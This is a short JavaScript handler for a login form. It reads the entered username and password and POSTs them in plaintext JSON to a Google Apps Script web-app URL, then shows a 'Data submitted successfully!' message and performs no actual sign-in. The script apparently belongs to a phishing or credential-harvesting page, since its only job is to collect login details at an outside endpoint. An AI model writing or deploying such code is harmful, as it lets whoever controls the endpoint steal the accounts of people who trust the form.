document.getElementById('loginForm').addEventListener('submit', async (event) => {
    event.preventDefault();

    const username = document.getElementById('uid_8').value;
    const password = document.getElementById('uid_10').value;

    try {
        const response = await fetch('https://script.google.com/macros/s/AKfycbyP4lkq4M3xE_hq-dBzDyVIB8R3SzF-Q9zURjHC4Fyr8FeLPqXVjVCOKmifSUk11Rsi/exec', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ username, password }),
        });

        const result = await response.json();
        if (result.status === 'success') {
            document.getElementById('response').textContent = 'Data submitted successfully!';
        } else {
            document.getElementById('response').textContent = 'Error submitting data.';
        }
    } catch (error) {
        document.getElementById('response').textContent = `Error: ${error.message}`;
    }
});